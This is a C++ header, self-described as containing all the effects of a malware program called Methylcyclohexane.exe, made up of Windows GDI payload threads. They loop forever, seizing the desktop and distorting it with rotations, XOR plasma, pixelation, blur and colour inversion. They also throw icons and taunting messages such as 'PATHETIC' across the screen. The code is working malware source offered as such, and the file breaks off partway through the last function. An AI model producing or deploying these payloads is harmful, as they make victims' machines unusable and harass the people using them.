/*
*  CODED BY Danoni631
* 
* This is ALL effects of this malware
*/

#pragma once

// includes necessary file
#include "Methylcyclohexane.h"

// Width and Height
int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);

// Variable for Pat bombs
#define SRCRAINBOW (DWORD)0x922222

// Some short enums to use in effects
typedef enum
{
	MEM_ALLOC_TYPES = MEM_COMMIT | MEM_RESERVE
} MalwareEnums;

// namespace with effects
namespace GDIPayloads
{
    // first effect - Rotating HSL
	DWORD WINAPI GDIShader1(LPVOID lpParam)
	{
        HDC hdc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;

        PRGBQUAD_t prgbDst = nullptr;
        HBITMAP hbmDst = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&prgbDst, NULL, 0);
        SelectObject(dcCopy, hbmDst);

        PRGBQUAD_t prgbSrc =
        (PRGBQUAD_t)VirtualAlloc(NULL, w * h * sizeof(RGBQUAD_t), MEM_ALLOC_TYPES, PAGE_READWRITE);

        float angle = 0.0f;

        float cx = w / 2.0f;
        float cy = h / 2.0f;

        while (true)
        {
            BitBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            memcpy(prgbSrc, prgbDst, w * h * sizeof(RGBQUAD_t));

            float cosT = cosf(angle);
            float sinT = sinf(angle);

            for (int y = 0; y < h; y += 2)
            {
                float dy = (float)y - cy;

                for (int x = 0; x < w; x += 2)
                {
                    float dx = (float)x - cx;

                    int srcX = (int)(cosT * dx + sinT * dy + cx);
                    int srcY = (int)(-sinT * dx + cosT * dy + cy);

                    RGBQUAD_t origPixel = { 0 };

                    if (srcX >= 0 && srcX < w && srcY >= 0 && srcY < h)
                    {
                        origPixel = prgbSrc[srcY * w + srcX];
                    }

                    HSL hsl = RGBtoHSL(origPixel);
                    hsl.h = (float)fmod(hsl.h + (angle * 0.1f) + ((float)(x + y) / (w + h) * 0.1f), 1.0f);
                    hsl.s = 1.0f;

                    RGBQUAD_t effectPixel = HSLtoRGB(hsl);

                    RGBQUAD_t finalPixel;
                    finalPixel.r = (origPixel.r > effectPixel.r) ? origPixel.r : effectPixel.r;
                    finalPixel.g = (origPixel.g > effectPixel.g) ? origPixel.g : effectPixel.g;
                    finalPixel.b = (origPixel.b > effectPixel.b) ? origPixel.b : effectPixel.b;
                    finalPixel.reserved = 0;

                    for (int by = 0; by < 2; by++)
                    {
                        for (int bx = 0; bx < 2; bx++)
                        {
                            int targetX = x + bx;
                            int targetY = y + by;

                            if (targetX < w && targetY < h)
                            {
                                prgbDst[targetY * w + targetX] = finalPixel;
                            }
                        }
                    }
                }
            }

            BitBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, SRCCOPY);

            angle += 0.015f;
            Sleep(10);
        }

        VirtualFree(prgbSrc, 0, MEM_RELEASE);
        DeleteObject(hbmDst);
        DeleteDC(dcCopy);
        ReleaseDC(NULL, hdc);

        return 0;
	}

    // second effect - Sierspinski red RGBQUAD triangles + sinewaves (inspired on makmak) 
    DWORD WINAPI GDIShader2(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;

        PRGBQUAD_t prgbDst = nullptr;
        HBITMAP hbmDst = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&prgbDst, NULL, 0);
        SelectObject(dcCopy, hbmDst);

        PRGBQUAD_t prgbSrc =
        (PRGBQUAD_t)VirtualAlloc(NULL, w * h * sizeof(RGBQUAD_t), MEM_ALLOC_TYPES, PAGE_READWRITE);

        int t = 0;

        while (true)
        {
            BitBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            memcpy(prgbSrc, prgbDst, w * h * sizeof(RGBQUAD_t));

            float timeVal = t * 0.08f;

            for (int y = 0; y < h; y += 2)
            {
                float wave = sinf((y * 0.025f) + timeVal) * 24.0f;

                for (int x = 0; x < w; x += 2)
                {
                    int displacedX = x + (int)wave;
                    int displacedY = y + (int)(cosf((x * 0.025f) + timeVal) * 12.0f);

                    UINT u = (UINT)((displacedX % w + w) % w);
                    UINT v = (UINT)((displacedY % h + h) % h);

                    RGBQUAD_t srcPixel = prgbSrc[v * w + u];

                    int sierpinskiPattern = (u + t) & (v - t);

                    BYTE blueChannel = (BYTE)((srcPixel.b ^ (sierpinskiPattern & 0xFF)) + (t % 64));
                    BYTE redChannel = (BYTE)((srcPixel.r >> 2) & 0x3F);
                    BYTE greenChannel = (BYTE)((srcPixel.g >> 1) & 0x7F);

                    for (int by = 0; by < 2; by++)
                    {
                        for (int bx = 0; bx < 2; bx++)
                        {
                            int targetX = x + bx;
                            int targetY = y + by;

                            if (targetX < w && targetY < h)
                            {
                                int idx = targetY * w + targetX;
                                prgbDst[idx].r = redChannel;
                                prgbDst[idx].g = greenChannel;
                                prgbDst[idx].b = blueChannel;
                                prgbDst[idx].reserved = 0;
                            }
                        }
                    }
                }
            }

            BitBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, SRCCOPY);

            t += 2;
            Sleep(10);
        }

        VirtualFree(prgbSrc, 0, MEM_RELEASE);
        DeleteObject(hbmDst);
        DeleteDC(dcCopy);
        ReleaseDC(NULL, hdc);

        return 0;
    }

    // while effect 1 - Bouncing icons with random sizes (UltraDasher icons attemp)
    DWORD WINAPI Icons(LPVOID lpParam)
    {
        HICON hApplicationIcon;
        int x = w - 10;
        int y = 10;
        int incrementor = rand() % 20;

        int signX = -1;
        int signY = -1;

        int ws = w / 12;
        int hs = h / 12;

        while (true)
        {
            HDC hdc = GetDC(HWND_DESKTOP);

            x += incrementor * signX;
            y += incrementor * signY;

            HINSTANCE lib = LoadLibraryA("moricons.dll");
            hApplicationIcon = LoadIcon(lib, MAKEINTRESOURCE(rand() % 113));

            int IconWidth = rand() % ws;
            int IconHeight = rand() % hs;

            DrawIconEx(hdc, x, y, hApplicationIcon, IconWidth, IconHeight, 0, NULL, DI_NORMAL);

            if (y >= h)
            {
                signY = -1;
            }

            if (x >= w)
            {
                signX = -1;
            }

            if (y == 0)
            {
                signY = 1;
            }

            if (x == 0)
            {
                signX = 1;
            }

            Sleep(1);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }
    }

    // while effect 2 - More bouncing icons with different sizes, but with a diferent icon library
    DWORD WINAPI Icons2(LPVOID lpParam)
    {
        HICON hApplicationIcon;
        int x = 10;
        int y = 10;
        int incrementor = rand() % 40;

        int signX = -1;
        int signY = -1;

        int ws = w / 12;
        int hs = h / 12;

        while (true)
        {
            HDC hdc = GetDC(HWND_DESKTOP);

            x += incrementor * signX;
            y += incrementor * signY;

            HINSTANCE lib = LoadLibraryA("shell32.dll");
            hApplicationIcon = LoadIcon(lib, MAKEINTRESOURCE(rand() % 113));

            int IconWidth = rand() % ws;
            int IconHeight = rand() % hs;

            DrawIconEx(hdc, x, y, hApplicationIcon, IconWidth, IconHeight, 0, NULL, DI_NORMAL);

            if (y >= h)
            {
                signY = -1;
            }

            if (x >= w)
            {
                signX = -1;
            }

            if (y == 0)
            {
                signY = 1;
            }

            if (x == 0)
            {
                signX = 1;
            }

            Sleep(1);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }
    }

    // while effect 3 - Random texts like Purgatorium
    DWORD WINAPI Texts(LPVOID lpParam)
    {
        HDC hdc = GetDC(0);

        LOGFONTW lFont = { 0 };

        lFont.lfWidth = 20;
        lFont.lfHeight = 60;
        lFont.lfOrientation = 400;
        lFont.lfWeight = 600;
        lFont.lfUnderline = true;
        lFont.lfQuality = DRAFT_QUALITY;
        lFont.lfPitchAndFamily = DEFAULT_PITCH | FF_ROMAN;

        lstrcpy(lFont.lfFaceName, L"Arial Black");

        int state = 0;
        int r = 0;
        int g = 0;
        int b = 0;

        while (true)
        {
            if (state == 0)
            {
                g += 5; if (g >= 255) state = 1;
            }

            else if (state == 1)
            {
                r -= 5; if (r <= 0) state = 2;
            }

            else if (state == 2)
            {
                b += 5; if (b >= 255) state = 3;
            }

            else if (state == 3)
            {
                g -= 5; if (g <= 0) state = 4;
            }

            else if (state == 4)
            {
                r += 5; if (r >= 255) state = 5;
            }

            else if (state == 5)
            {
                b -= 5; if (b <= 0) state = 0;
            }

            lFont.lfEscapement = rand() % 60;

            HFONT hFont = CreateFontIndirectW(&lFont);
            SelectObject(hdc, hFont);

            SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
            SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));

            TextOutA(hdc, rand() % w, rand() % h, "Methylcyclohexane.exe", lstrlenA("Methylcyclohexane.exe"));

            Sleep(rand() % 5);
        }

        return 0;
    }

    // third effect - Moving screen with RGBQUAD plasma
    DWORD WINAPI GDIShader3(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;

        PRGBQUAD_t prgbDst = nullptr;
        HBITMAP hbmDst = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&prgbDst, NULL, 0);
        SelectObject(dcCopy, hbmDst);

        PRGBQUAD_t prgbSrc =
        (PRGBQUAD_t)VirtualAlloc(NULL, w * h * sizeof(RGBQUAD_t), MEM_ALLOC_TYPES, PAGE_READWRITE);

        float t = 0.0f;

        while (true)
        {
            BitBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            memcpy(prgbSrc, prgbDst, w * h * sizeof(RGBQUAD_t));

            int scrollX = (int)(sinf(t * 0.05f) * 25.0f);
            int scrollY = (int)(cosf(t * 0.04f) * 25.0f);

            float timeStep = t * 0.08f;

            for (int y = 0; y < h; y += 2)
            {
                for (int x = 0; x < w; x += 2)
                {
                    int srcX = (x + scrollX) % w;
                    if (srcX < 0) srcX += w;
                    int srcY = (y + scrollY) % h;
                    if (srcY < 0) srcY += h;

                    RGBQUAD_t screenPixel = prgbSrc[srcY * w + srcX];

                    float fx = (float)x * 0.015f;
                    float fy = (float)y * 0.015f;

                    float p1 = sinf(fx + timeStep);
                    float p2 = sinf(fy - timeStep * 0.7f);
                    float p3 = sinf((fx + fy) + timeStep * 1.2f);
                    float p4 = sinf(sqrtf(fx * fx + fy * fy) * 2.0f - timeStep);

                    float plasmaVal = p1 + p2 + p3 + p4;

                    BYTE plasmaR = (BYTE)((sinf(plasmaVal + 0.0f) + 1.0f) * 127.5f);
                    BYTE plasmaG = (BYTE)((sinf(plasmaVal + 2.094f) + 1.0f) * 127.5f);
                    BYTE plasmaB = (BYTE)((sinf(plasmaVal + 4.188f) + 1.0f) * 127.5f);

                    BYTE finalR = screenPixel.r ^ plasmaR;
                    BYTE finalG = screenPixel.g ^ plasmaG;
                    BYTE finalB = (screenPixel.b + plasmaB) / 2;

                    for (int by = 0; by < 2; by++)
                    {
                        for (int bx = 0; bx < 2; bx++)
                        {
                            int targetX = x + bx;
                            int targetY = y + by;

                            if (targetX < w && targetY < h)
                            {
                                int idx = targetY * w + targetX;
                                prgbDst[idx].r = finalR;
                                prgbDst[idx].g = finalG;
                                prgbDst[idx].b = finalB;
                                prgbDst[idx].reserved = 0;
                            }
                        }
                    }
                }
            }

            BitBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, SRCCOPY);

            t += 1.0f;
            Sleep(10);
        }
        
        VirtualFree(prgbSrc, 0, MEM_RELEASE);
        DeleteObject(hbmDst);
        DeleteDC(dcCopy);
        ReleaseDC(NULL, hdc);

        return 0;
    }

    // fourth effect - JPEG COMPRESSION JNENIE9EJIJEVEVJEFINIWNIEDNINSWINEDIN34HJDWN9VFIENSD
    DWORD WINAPI GDIShader4(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;

        PRGBQUAD_t prgbDst = nullptr;
        HBITMAP hbmDst = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&prgbDst, NULL, 0);
        SelectObject(dcCopy, hbmDst);

        PRGBQUAD_t prgbSrc =
        (PRGBQUAD_t)VirtualAlloc(NULL, w * h * sizeof(RGBQUAD_t), MEM_ALLOC_TYPES, PAGE_READWRITE);

        int t = 0;

        while (true)
        {
            BitBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            memcpy(prgbSrc, prgbDst, w * h * sizeof(RGBQUAD_t));

            int blockSize = 4 + (int)((sinf(t * 0.05f) + 1.0f) * 6.0f);

            int colorQuant = 32;

            for (int y = 0; y < h; y += blockSize)
            {
                for (int x = 0; x < w; x += blockSize)
                {
                    UINT sumR = 0;
                    UINT sumG = 0;
                    UINT sumB = 0;

                    int count = 0;

                    for (int by = 0; by < blockSize; by++)
                    {
                        for (int bx = 0; bx < blockSize; bx++)
                        {
                            int px = x + bx;
                            int py = y + by;

                            if (px < w && py < h)
                            {
                                RGBQUAD_t p = prgbSrc[py * w + px];
                                sumR += p.r;
                                sumG += p.g;
                                sumB += p.b;
                                count++;
                            }
                        }
                    }

                    if (count == 0) continue;

                    BYTE avgR = (BYTE)(sumR / count);
                    BYTE avgG = (BYTE)(sumG / count);
                    BYTE avgB = (BYTE)(sumB / count);

                    avgR = (avgR / colorQuant) * colorQuant;
                    avgG = (avgG / colorQuant) * colorQuant;
                    avgB = (avgB / colorQuant) * colorQuant;

                    for (int by = 0; by < blockSize; by++)
                    {
                        for (int bx = 0; bx < blockSize; bx++)
                        {
                            int px = x + bx;
                            int py = y + by;

                            if (px < w && py < h)
                            {
                                int idx = py * w + px;

                                bool isBlockEdge = (bx == 0 || by == 0);
                                int edgeNoise = isBlockEdge ? ((x ^ y) & 0x0F) : 0;

                                prgbDst[idx].r = (BYTE)min(255, max(0, avgR + edgeNoise));
                                prgbDst[idx].g = (BYTE)min(255, max(0, avgG + edgeNoise));
                                prgbDst[idx].b = (BYTE)min(255, max(0, avgB + edgeNoise));
                                prgbDst[idx].reserved = 0;
                            }
                        }
                    }
                }
            }

            BitBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, SRCCOPY);

            t++;
            Sleep(15);
        }

        VirtualFree(prgbSrc, 0, MEM_RELEASE);
        DeleteObject(hbmDst);
        DeleteDC(dcCopy);
        ReleaseDC(NULL, hdc);
    }

    // fifth effect - rotating screen with alphablend and a blue color (HSV)
    DWORD WINAPI GDIShader5(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        HDC dcSrc = CreateCompatibleDC(hdc);
        HDC dcRoto = CreateCompatibleDC(hdc);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;

        RGBQUAD* prgbSrc = nullptr;
        HBITMAP hbmSrc = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&prgbSrc, NULL, 0);
        SelectObject(dcSrc, hbmSrc);

        RGBQUAD* prgbRoto = nullptr;
        HBITMAP hbmRoto = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&prgbRoto, NULL, 0);
        SelectObject(dcRoto, hbmRoto);

        BLENDFUNCTION blend = { 0 };
        blend.BlendOp = AC_SRC_OVER;
        blend.BlendFlags = 0;
        blend.SourceConstantAlpha = 200;
        blend.AlphaFormat = 0;

        float t = 0.0f;
        float cx = w / 2.0f;
        float cy = h / 2.0f;

        while (true)
        {
            BitBlt(dcSrc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

            float angle = t * 0.02f;
            float zoom = 1.0f + (sinf(t * 0.05f) * 0.3f);
            float cosT = cosf(angle) / zoom;
            float sinT = sinf(angle) / zoom;

            for (int y = 0; y < h; y += 2)
            {
                float dy = (float)y - cy;

                for (int x = 0; x < w; x += 2)
                {
                    float dx = (float)x - cx;

                    int srcX = (int)(cosT * dx - sinT * dy + cx);
                    int srcY = (int)(sinT * dx + cosT * dy + cy);

                    srcX = (srcX % w + w) % w;
                    srcY = (srcY % h + h) % h;

                    RGBQUAD pixel = prgbSrc[srcY * w + srcX];

                    HSV hsv = RGBtoHSV(pixel);
                    hsv.h = fmodf(hsv.h + (t * 0.01f) + ((float)(x + y) / (w + h) * 0.2f), 1.0f);
                    hsv.s = 1.0f;

                    RGBQUAD processed = HSVtoRGB(hsv);

                    for (int by = 0; by < 2; by++)
                    {
                        for (int bx = 0; bx < 2; bx++)
                        {
                            int targetX = x + bx;
                            int targetY = y + by;

                            if (targetX < w && targetY < h)
                            {
                                prgbRoto[targetY * w + targetX] = processed;
                            }
                        }
                    }
                }
            }

            AlphaBlend(hdc, 0, 0, w, h, dcRoto, 0, 0, w, h, blend);

            t += 1.0f;
            Sleep(10);
        }

        DeleteObject(hbmSrc);
        DeleteObject(hbmRoto);
        DeleteDC(dcSrc);
        DeleteDC(dcRoto);
        ReleaseDC(NULL, hdc);

        return 0;
    }

    // sixth effect - RGBQUAD Xor rotozoomer stretching (i tried to replicatite CrzxyMinty rotozoomer, but he
    // sayed that rotozoomer is a remake of JhoPro's rotozoomer)
    DWORD WINAPI GDIShader6(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(hdc);

        int ws = w / 4;
        int hs = h / 4;

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        PRGBQUAD_t rgbquad = NULL;

        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        int i = 0;
        double angle = 0.f;

        while (1)
        {
            StretchBlt(dcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);
            RGBQUAD_t rgbquadCopy;

            for (int x = 0; x < ws; x++)
            {
                for (int y = 0; y < hs; y++)
                {
                    int index = y * ws + x;

                    int cx = (x - (ws / 2));
                    int cy = (y - (hs / 2));

                    int zx = cos(angle) * cx - tan(angle) * cy;
                    int zy = sin(angle) * cx + tan(angle) * cy;

                    int fx = (zx + i) ^ (zy + i);

                    rgbquad[index].r += fx;
                    rgbquad[index].g += fx / 4;
                    rgbquad[index].b += fx / 2;
                }
            }

            i++; angle += 0.01f;

            StretchBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
            Sleep(1);
        }

        return 0;
    }

    // while effect 4 - HSL NOTSRCINVERT Pat bombs
    DWORD WINAPI GDIPatBombs(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);

        HDC dcCopy = CreateCompatibleDC(hdc);
        HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(dcCopy, hbm);

        int counter = 0;

        int r = 255;
        int g = 0;
        int b = 0;

        int state = 0;

        while (true)
        {
            if (state == 0)
            {
                g += 5; if (g >= 255) state = 1;
            }

            else if (state == 1)
            {
                r -= 5; if (r <= 0) state = 2;
            }

            else if (state == 2)
            {
                b += 5; if (b >= 255) state = 3;
            }

            else if (state == 3)
            {
                g -= 5; if (g <= 0) state = 4;
            }

            else if (state == 4)
            {
                r += 5; if (r >= 255) state = 5;
            }

            else if (state == 5)
            {
                b -= 5; if (b <= 0) state = 0;
            }

            if (counter % 15 == 0)
            {
                BitBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            }

            COLORREF brushColor = RGB(r, g, b);
            HBRUSH hBrush = CreateSolidBrush(brushColor);
            HBRUSH hOldBrush = (HBRUSH)SelectObject(hdc, hBrush);

            int bombX = rand() % w;
            int bombY = rand() % h;
            int bombSize = 60 + (rand() % 180);

            BitBlt
            (
                hdc,
                bombX + (rand() % 20 - 10), bombY + (rand() % 20 - 10),
                bombSize, bombSize,
                dcCopy,
                bombX, bombY,
                SRCRAINBOW
            );

            SelectObject(hdc, hOldBrush);
            DeleteObject(hBrush);

            counter++;

            Sleep(1);
        }

        DeleteObject(hbm);
        DeleteDC(dcCopy);
        ReleaseDC(NULL, hdc);

        return 0;
    }

    // while effect 5 - Random HSL texts
    DWORD WINAPI Texts2(LPVOID lpParam)
    {
        int r = 255;
        int g = 0;
        int b = 0;

        int state = 0;

        while (true)
        {
            int x = rand() % w;
            int y = rand() % h;

            if (state == 0)
            {
                g += 5; if (g >= 255) state = 1;
            }

            else if (state == 1)
            {
                r -= 5; if (r <= 0) state = 2;
            }

            else if (state == 2)
            {
                b += 5; if (b >= 255) state = 3;
            }

            else if (state == 3)
            {
                g -= 5; if (g <= 0) state = 4;
            }

            else if (state == 4)
            {
                r += 5; if (r >= 255) state = 5;
            }

            else if (state == 5)
            {
                b -= 5; if (b <= 0) state = 0;
            }

            HDC hdc = GetDC(NULL);

            LPCSTR string[10] =
            {
                "Danoni631", "SuperNaray", "CrzxyMinty",
                "Methylcyclohexane.exe", "You are nothing in this virtual trash",
                "PATHETIC", "I will desintegrate you with this!", "You is in Ohio :D",
                "FIRST, is not OUR world, IS MINE", "Windows beeing Expunged"
            };

            int StringIndex = rand() % 10;

            SetBkMode(hdc, 0);

            int size = rand() % 100;

            SetTextColor(hdc, RGB(r, g, b));
            
            HFONT Font =
            CreateFontA
            (
                size, size, rand() % 3600, rand() % 60,
                FW_REGULAR, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Impact"
            );

            SelectObject(hdc, Font);
            TextOutA(hdc, x, y, string[StringIndex], strlen(string[StringIndex]));

            DeleteObject(Font);
            ReleaseDC(0, hdc);
            Sleep(10);
        }
    }

    // seventh effect - generic RGB
    DWORD WINAPI Pats(LPVOID lpParam)
    {
        while (true)
        {
            HDC hdc = GetDC(0);
            HDC dcCopy = CreateCompatibleDC(hdc);
            HBITMAP bm = CreateCompatibleBitmap(hdc, w, h);
            SelectObject(dcCopy, bm);
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);
            PatBlt(hdc, 0, 0, w, h, PATINVERT);
            DeleteObject(brush);
            DeleteObject(dcCopy);
            DeleteObject(bm);
            ReleaseDC(0, hdc);
            Sleep(1000);
        }
    }

    // idk effect - Blur made by Rekto and JhoPro asdjjodajoawjodjfesjfoiefoiwanhdii
    DWORD WINAPI Blur(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(dcCopy, bmp);

        BLENDFUNCTION blur = { AC_SRC_OVER, 0, 10, 0 };

        while (true)
        {
            StretchBlt
            (
                dcCopy,
                50, 0, w, h,
                hdc,
                0, 0, w, h, SRCCOPY
            );
            AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);

            Sleep(1);

            StretchBlt
            (
                dcCopy,
                0, 50, w, h,
                hdc,
                0, 0, w, h, SRCCOPY
            );
            AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);

            Sleep(1);

            StretchBlt
            (
                dcCopy,
                0, 0, w, h,
                hdc,
                50, 0, w, h, SRCCOPY
            );
            AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);

            Sleep(1);

            StretchBlt
            (
                dcCopy,
                0, 0, w, h,
                hdc,
                0, 50, w, h, SRCCOPY
            );
            AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);

            Sleep(1);
        }

        return 0;
    }

    // nine effect (my god, im so dumb) - Mandelbrot set
    DWORD WINAPI GDIShader7(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;

        PRGBQUAD_t prgbDst = nullptr;
        HBITMAP hbmDst = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&prgbDst, NULL, 0);
        SelectObject(dcCopy, hbmDst);

        float t = 0.0f;
        const int maxIterations = 50;

        while (true)
        {
            float angle = t * 0.015f;
            float cosA = cosf(angle);
            float sinA = sinf(angle);

            float cx = (float)w / 2.0f;
            float cy = (float)h / 2.0f;
            float scale = 2.5f / (float)h;

            for (int y = 0; y < h; y += 2)
            {
                float y0 = ((float)y - cy) * scale;

                for (int x = 0; x < w; x += 2)
                {
                    float x0 = ((float)x - cx) * scale;

                    float rotX = x0 * cosA - y0 * sinA;
                    float rotY = x0 * sinA + y0 * cosA;

                    float zr = 0.0f;
                    float zi = 0.0f;
                    int iteration = 0;

                    while (zr * zr + zi * zi <= 4.0f && iteration < maxIterations)
                    {
                        float temp = zr * zr - zi * zi + rotX;
                        zi = 2.0f * zr * zi + rotY;
                        zr = temp;
                        iteration++;
                    }

                    RGBQUAD_t pixelColor;

                    if (iteration >= maxIterations)
                    {
                        pixelColor.r = 0;
                        pixelColor.g = 0;
                        pixelColor.b = 10;
                    }
                    else
                    {
                        HSL hsl;
                        hsl.h = (float)fmod((float)iteration / maxIterations + (t * 0.01f), 1.0f);
                        hsl.s = 1.0f;
                        hsl.l = (float)iteration / maxIterations;

                        pixelColor = HSLtoRGB(hsl);
                    }

                    for (int by = 0; by < 2; by++)
                    {
                        for (int bx = 0; bx < 2; bx++)
                        {
                            int targetX = x + bx;
                            int targetY = y + by;

                            if (targetX < w && targetY < h)
                            {
                                prgbDst[targetY * w + targetX] = pixelColor;
                            }
                        }
                    }
                }
            }

            BitBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, SRCINVERT);

            t += 1.0f;
            Sleep(10);
        }

        DeleteObject(hbmDst);
        DeleteDC(dcCopy);
        ReleaseDC(NULL, hdc);

        return 0;
    }

    // ndonovkdnosknsd effect - Pentacyanocyclopentadine HSL shader but with hslcolor.l was modified
    DWORD WINAPI GDIShader8(LPVOID lpParam)
    {
        HDC hdc = GetDC(0);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;


        PRGBQUAD_t rgbquad = NULL;
        HSL hslcolor;

        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 0;

        while (1)
        {
            hdc = GetDC(NULL);
            StretchBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

            RGBQUAD_t rgbquadCopy;

            for (int x = 0; x < w; x++)
            {
                for (int y = 0; y < h; y++)
                {
                    int index = y * w + x;

                    int fx = (int)((i ^ 4) + (i * 4) * sqrt(x ^ y ^ i ^ 7 | x + y));

                    rgbquadCopy = rgbquad[index];

                    hslcolor = RGBtoHSL(rgbquadCopy);
                    hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);
                    hslcolor.l *= 1.125f;

                    if (hslcolor.l > .5f)
                    {
                        hslcolor.l -= .5f;
                    }

                    if (hslcolor.l < .25f)
                    {
                        hslcolor.l += .25f;
                    }

                    rgbquad[index] = HSLtoRGB(hslcolor);
                }
            }

            i++;

            StretchBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }

        return 0;
    }

    // jwefojo effect - hsl flipped xor pattern
    DWORD WINAPI GDIShader9(LPVOID lpParam)
    {
        HDC hdc = GetDC(0);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;


        PRGBQUAD_t rgbquad = NULL;
        HSL hslcolor;

        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 0;

        while (1)
        {
            hdc = GetDC(NULL);
